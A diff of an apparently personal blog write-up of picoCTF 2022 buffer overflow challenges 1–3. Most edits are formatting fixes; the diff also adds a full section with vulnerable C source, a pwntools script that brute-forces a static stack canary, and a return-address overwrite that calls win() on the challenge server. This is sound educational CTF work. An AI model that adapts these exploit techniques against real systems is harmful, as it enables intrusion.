@@ -242,15 +242,15 @@ In the `vuln()` function, we see that once again, the `gets()` function is being
 
 Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:
 
-![Stack Visualization](asset/pico22/buffer-overflow/stack-visual.png)
+<img src="/asset/pico22/buffer-overflow/stack-visual.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">
 
 Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.
 
 We can "smash the stack" by exploiting the `gets()` function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:
 
-![Overflow Visualization](asset/pico22/buffer-overflow/overflow-visual.png)
+<img src="/asset/pico22/buffer-overflow/overflow-visual.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">
 
-If we are delibrate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!
+If we are deliberate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!
 
 ### Part II: Smashing the Stack
 
@@ -321,7 +321,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 ### Part III: Finessing the Stack
 
-Although we've managed to smash the stack, we still dont' know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:
+Although we've managed to smash the stack, we still don't know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:
 
 <figure class="highlight text"><table><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
@@ -410,6 +410,7 @@ Let's make a final visual of our payload:
 Let's write our payload and send it to the remote server with Python3/pwntools:
 
 {% codeblock lang:py buffer-overflow-1.py https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394 <span style="color:#82C4E4">[github gist link]</span> %}
+#!/usr/bin/env python3
 from pwn import *
 
 payload = b"A"*44 + p32(0x80491f6)  # Little endian: b'\xf6\x91\x04\x08'
@@ -448,8 +449,8 @@ The main helper we will be using is [`pwnlib.elf.corefile`](https://docs.pwntool
 
 Before we start, let's work through the steps with command-line Python. First, let's import the pwntools global namespace and generate an `elf` object using pwntool's `ELF()`:
 
-<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre><span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">&gt;&gt;&gt;</span> from pwn import *
-<span class="meta prompt_">&gt;&gt;&gt;</span> elf = context.binary = ELF('./vuln')
+<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre><span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">>>></span> from pwn import *
+<span class="meta prompt_">>>></span> elf = context.binary = ELF('./vuln')
 [<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
     Arch:     i386-32-little
     RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
@@ -461,13 +462,13 @@ Before we start, let's work through the steps with command-line Python. First, l
 
 We can then generate a `cyclic()` payload and start a local process referencing the aforementioned `elf` object. Sending the payload and using the [`.wait()`](https://www.educba.com/python-wait/) method will throw an exit code -11, which signals a segmentation fault and generates a core dump. 
 
-<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre style="white-space: pre-wrap"><span class="meta prompt_">&gt;&gt;&gt;</span> p = process(elf.path)
+<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre style="white-space: pre-wrap"><span class="meta prompt_">>>></span> p = process(elf.path)
 [<span style="color:#9755B3">x</span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
 [<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2219
-<span class="meta prompt_">&gt;&gt;&gt;</span> p.sendline(cyclic(128))
-<span class="meta prompt_">&gt;&gt;&gt;</span> p.wait()
+<span class="meta prompt_">>>></span> p.sendline(cyclic(128))
+<span class="meta prompt_">>>></span> p.wait()
 [<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2219)
-<span class="meta prompt_">&gt;&gt;&gt;</span> exit()
+<span class="meta prompt_">>>></span> exit()
 <span class="meta prompt_">$ </span>ls -al
 total 2304
 drwxr-xr-x  3 kali kali    4096 Jun 16 15:35 <span style="color:#277FFF"><b>.</b></span>
@@ -501,6 +502,7 @@ Now that we know how ELF objects and core dumps work, let's apply them to our pr
 This is my final, completely automated script:
 
 {% codeblock lang:py buffer-overflow-1-automated.py https://gist.github.com/jktrn/b1586f403c6ae31ce0e128b8f96faad6 <span style="color:#82C4E4">[github gist link]</span> %}
+#!/usr/bin/env python3
 from pwn import *
 
 elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
@@ -559,6 +561,18 @@ We've successfully automated a solve on a simple x32 buffer overflow!
 <div class="text-warning">
 <i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
 </div>
+
+<figure class="highlight console">
+  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
+      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
+<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+</pre></td></tr></table></figure>
 
 Let's check out our source code:
 
@@ -626,21 +640,21 @@ The goal is simple: call `win(0xCAFEF00D, 0xF00DF00D)`! We'll be doing it the ha
 We can apply a lot from what we learned in `Buffer overflow 1`. The first thing we should do is find the offset, which requires no hassle with pwntools helpers! Although we'll get actual number here, I won't include it in the final script for the sake of not leaving out any steps. Simply segfault the process with a cyclic string, read the core dump's fault address (`$eip`) and throw it into `cyclic_find()`:
 
 <figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">$ </span>python3 -q
-<span class="meta prompt_">&gt;&gt;&gt; </span>from pwn import *
-<span class="meta prompt_">&gt;&gt;&gt; </span>elf = context.binary = ELF(&apos;./vuln&apos;)
+<span class="meta prompt_">>>> </span>from pwn import *
+<span class="meta prompt_">>>> </span>elf = context.binary = ELF(&apos;./vuln&apos;)
 [<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
     Arch:     i386-32-little
     RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
     Stack:    <span style="color:#D41919">No canary found</span>
     NX:       <span style="color:#5EBDAB">NX enabled</span>
     PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
-<span class="meta prompt_">&gt;&gt;&gt; </span>p = process(elf.path)
+<span class="meta prompt_">>>> </span>p = process(elf.path)
 [<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
 [<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 2777
-<span class="meta prompt_">&gt;&gt;&gt; </span>p.sendline(cyclic(128))
-<span class="meta prompt_">&gt;&gt;&gt; </span>p.wait()
+<span class="meta prompt_">>>> </span>p.sendline(cyclic(128))
+<span class="meta prompt_">>>> </span>p.wait()
 [<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 2777)
-<span class="meta prompt_">&gt;&gt;&gt; </span>core = Corefile(&apos;./core&apos;)
+<span class="meta prompt_">>>> </span>core = Corefile(&apos;./core&apos;)
 [<span style="color:#9755B3">x</span>] Parsing corefile...
 [<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
     Arch:      i386-32-little
@@ -649,7 +663,7 @@ We can apply a lot from what we learned in `Buffer overflow 1`. The first thing 
     Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
     Fault:     0x62616164
 [<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
-<span class="meta prompt_">&gt;&gt;&gt; </span>cyclic_find(0x62616164)
+<span class="meta prompt_">>>> </span>cyclic_find(0x62616164)
 112
 </pre></td></tr></table></figure>
 
@@ -660,6 +674,7 @@ The next thing we need to know about is the way functions are laid out on the st
 If we want to call a function with parameters, we'll need to include the base pointer alongside a return address, which can simply be `main()`. With this, we can basically copy our script over from `Buffer overflow 1` with a few tweaks to the payload:
 
 {% codeblock buffer-overflow-2.py lang:py https://gist.github.com/jktrn/c6c17fc63ca801d0b64d8bb5acc982c1 <span style="color:#82C4E4">[github gist link]</span> %}
+#!/usr/bin/env python3
 from pwn import *
 
 elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
@@ -711,6 +726,7 @@ picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}
 But... what if you wanted to be an even **more** lazy pwner? Well, you're in luck, because I present to you: the **[pwntools ROP object](https://docs.pwntools.com/en/stable/rop/rop.html)**! By throwing our elf object into `ROP()` it transforms, and we can use it to automatically call functions and build chains! Here it is in action:
 
 {% codeblock buffer-overflow-2-automated.py lang:py https://gist.github.com/jktrn/a5bfe03bdf5b2d766ef5fa402e9e35d6 <span style="color:#82C4E4">[github gist link]</span> %}
+#!/usr/bin/env python3
 from pwn import *
 
 elf = context.binary = ELF('./vuln' checksec=False)    # sets elf object
@@ -737,24 +753,186 @@ p.interactive()
 Let's run it on the remote server:
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-2-automated.py REMOTE
-[<font color="#277FFF"><b>*</b></font>] Loaded 10 cached gadgets for &apos;./vuln&apos;
-[<font color="#47D4B9"><b>+</b></font>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
-[<font color="#277FFF"><b>*</b></font>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
+[<span style="color:#277FFF"><b>*</b></span>] Loaded 10 cached gadgets for &apos;./vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
 -11 (SIGSEGV) (pid 4993)
-[<font color="#47D4B9"><b>+</b></font>] Parsing corefile...: Done
-[<font color="#277FFF"><b>*</b></font>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
     Arch:      i386-32-little
     EIP:       0x62616164
     ESP:       0xffd07fc0
     Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
     Fault:     0x62616164
-[<font color="#47D4B9"><b>+</b></font>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
-[<font color="#277FFF"><b>*</b></font>] Switching to interactive mode
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
 Please enter your string: 
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaa-
 avaaawaaaxaaayaaazaabbaabcaab\x96\x\xf0\xfe\xca
-picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}<font color="#EC0101"><b>$</b></font> [<font color="#277FFF"><b>*</b></font>] Got EOF while reading in interactive
+picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> [<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive
 </pre></td></tr></table></figure>
 
+We've successfully called a function with arguments through buffer overflow!
+
+---
+
+## Buffer overflow 3
+
+<div class="box no-highlight">
+  Do you think you can bypass the protection and get the flag?<br>
+  It looks like Dr. Oswal added a stack canary to this <a href="/asset/pico22/buffer-overflow/vuln-3">program</a> to protect against buffer overflows. You can view source
+  <a href="/asset/pico22/buffer-overflow/vuln-3.c">here</a>. And connect with it using:<br>
+  <code>nc saturn.picoctf.net [PORT]</code>
+  <br><br>
+  <b>Authors</b>: Sanjay C., Palash Oswal
+  <details>
+    <summary><b>Hint:</b></summary><br>1. Maybe there's a smart way to brute-force the canary?
+  </details>
+</div>
+
+<div class="text-warning">
+  <i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will
+  be redacted alongside the last eight characters of the flag, as they are dynamic.
+</div>
+
+<figure class="highlight console">
+  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
+      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
+<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+</pre></td></tr></table></figure>
+
+So, Dr. Oswal apparently implemented a [stack canary](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/), which is just a **dynamic value** appended to binaries during compilation. It helps detect and mitigate stack smashing attacks, and programs can terminate if they detect the canary being overwritten. Yet, `checksec` didn't find a canary. That's a bit suspicious... but let's check out our source code first:
+
+<div style="height:700px; overflow:auto; margin-top:15px; margin-bottom:15px;"><figure class="highlight c" style="margin-top:-10px;"><figcaption style="margin-top:5px;"><span>vuln-3.c</span><a href="https://enscribe.dev/asset/pico22/buffer-overflow/vuln-3.c"><span style=color:#82C4E4>[download source]</span></a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CANARY_SIZE 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f); <span class="comment">// size bound read</span></span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_canary[CANARY_SIZE];</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_canary</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;canary.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;canary.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging canary.\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fread(global_canary,<span class="keyword">sizeof</span>(<span class="type">char</span>),CANARY_SIZE,f);</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">char</span> canary[CANARY_SIZE];</span><br><span class="line">   <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">   <span class="type">char</span> length[BUFSIZE];</span><br><span class="line">   <span class="type">int</span> count;</span><br><span class="line">   <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">   <span class="built_in">memcpy</span>(canary,global_canary,CANARY_SIZE);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;</span>);</span><br><span class="line">   <span class="keyword">while</span> (x&lt;BUFSIZE) &#123;</span><br><span class="line">      read(<span class="number">0</span>,length+x,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (length[x]==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">      x++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">sscanf</span>(length,<span class="string">&quot;%d&quot;</span>,&amp;count);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input&gt; &quot;</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,count);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Ok... Now Where&#x27;s the Flag?\n&quot;</span>);</span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  read_canary();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+If you look closely, you might be able to see why `checksec` didn't find a stack canary. That's because it's actually a static variable, being read from a `canary.txt` on the host machine. Canaries that aren't implemented by the compiler are not really canaries!
+
+Knowing that the canary will be four bytes long (defined by `CANARY_SIZE`) and immediately after the 64-byte buffer (defined by `BUFSIZE`), we can write a brute forcing script that can determine the correct canary with a simple trick: **by not fully overwriting the canary the entire time!** Check out this segment of source code:
+
+{% codeblock lang:c first_line:60  %}
+   if (memcmp(canary,global_canary,CANARY_SIZE)) {
+      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
+      fflush(stdout);
+      exit(-1);
+   }
+{% endcodeblock %}
+
+This uses `memcmp()` to determine if the current canary is the same as the global canary. If it's different, then the program will run `exit(-1)`, which is a really weird/invalid exit code and supposedly represents "[abnormal termination](https://softwareengineering.stackexchange.com/questions/314563/where-did-exit-1-come-from)":
+
+<img src="/asset/pico22/buffer-overflow/memcmp1.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">
+
+However, if we theoretically overwrite the canary with a single correct byte, `memcmp()` won't detect anything!:
+
+<img src="/asset/pico22/buffer-overflow/memcmp2.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">
+
+We can now start writing our script! My plan is to loop through all printable characters for each canary byte, which can be imported from `string`. Let's include that in our pwn boilerplate alongside a simple function that allows us to swap between a local and remote instance:
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+from string import printable
+
+elf = context.binary = ELF("./vuln", checksec=False) # Creates ELF object
+host, port = "saturn.picoctf.net", [PORT]
+offset = 64
+
+def new_process(): # Specify remote or local instance with CLI argument
+    if args.LOCAL:
+        return process(elf.path)
+    else:
+        return remote(host, port)
+```
+
+Here's the big part: the `get_canary()` function. I'll be using [`pwnlib.log`](https://docs.pwntools.com/en/stable/log.html) for some spicy status messages. My general process for the brute force is visualized here if you're having trouble:
+
+<img src="/asset/pico22/buffer-overflow/brute-visual.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">
+
+I'll be initially sending 64 + 1 bytes, and slowly appending the correct canary to the end of my payload until the loop has completed four times:
+
+{% codeblock lang:py first_line:15 %}
+def get_canary():
+    canary = b""
+    logger = log.progress("Finding canary...")
+    for i in range(1, 5):
+        for char in printable:
+            with context.quiet: # Hides any other log
+                p = new_process()
+                p.sendlineafter(b"> ", str(offset + i).encode())
+                p.sendlineafter(b"> ", flat([{offset: canary}, char.encode()]))
+                output = p.recvall()
+                if b"?" in output: # If program doesn't crash
+                    canary += char.encode()
+                    logger.status(f'"{canary.decode()}"')
+                    break
+    logger.success(f'"{canary.decode()}"')
+    return canary
+{% endcodeblock %}
+
+The final thing we need to figure out is the offset between the canary to `$eip`, the pointer register, which we will repopulate with the address of `win()`. We can do this by appending a cyclic pattern to the end of our current payload (64 + 4 canary bytes) and reading the Corefile's crash location, which will be the `$eip`:
+
+(Note: My canary is "abcd" because I put that in my `canary.txt`. It will be different on the remote!)
+
+<figure class="highlight plaintext">
+    <table>
+        <tr>
+            <td class="code">
+                <pre style="white-space:pre-wrap"><span class="meta prompt_">$ </span>python3 -q
+<span class="meta prompt_">>>></span> from pwn import *
+<span class="meta prompt_">>>></span> p = process('./vuln')
+[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;: pid 1493
+<span class="meta prompt_">>>></span> payload = cyclic(64) + b&apos;abcd&apos; + cyclic(128)
+<span class="meta prompt_">>>></span> p.sendline(b&apos;196&apos;)
+<span class="meta prompt_">>>></span> p.sendline(payload)
+<span class="meta prompt_">>>></span> p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 1493)
+<span class="meta prompt_">>>></span> core = Corefile(&apos;./core&apos;)
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x61616165
+    ESP:       0xffa06160
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; (0x8048000)
+    Fault:     0x61616165
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span class="meta prompt_">>>></span> cyclic_find(0x61616165)
+16
+</pre>
+            </td>
+        </tr>
+    </table>
+</figure>
+
+The offset is 16, so we'll have to append that amount of bytes to the payload followed by the address of `win()`. I'll combine all sections of our payload together with `flat()`, and then hopefully read the flag from the output:
+
+{% codeblock lang:py first_line:32 %}
+canary = get_canary()
+p = new_process()
+payload = flat([{offset: canary}, {16: elf.symbols.win}])
+p.sendlineafter(b"> ", str(len(payload)).encode())
+p.sendlineafter(b"> ", payload)
+log.success(p.recvall().decode("ISO-8859-1")) # recvallS() didn't work :(
+{% endcodeblock %}
+
+Since I segmented my script into parts, I decided against putting a giant codeblock here with the same code as earlier. Instead, I just put it on a [Gist](https://gist.github.com/jktrn/bafbc08bbee179588207e3e3caffde75)! Anyways, here's the full script in action:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-3.py
+[<span style="color:#47D4B9"><b>+</b></span>] Finding canary: 'BiRd'
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 57427: Done
+[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (162B)
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port 57427
+[<span style="color:#47D4B9"><b>+</b></span>] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaBiRdraaasaaataa-
+auaaa6^H
+    Ok... Now Where&apos;s the Flag?
+    picoCTF{Stat1C_c4n4r13s_4R3_b4D_<span style="color:#696969"><b>[REDACTED]</b></span>}
+</pre></td></tr></table></figure>
+
+We've successfully performed a brute force on a vulnerable static canary!
 
 <a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
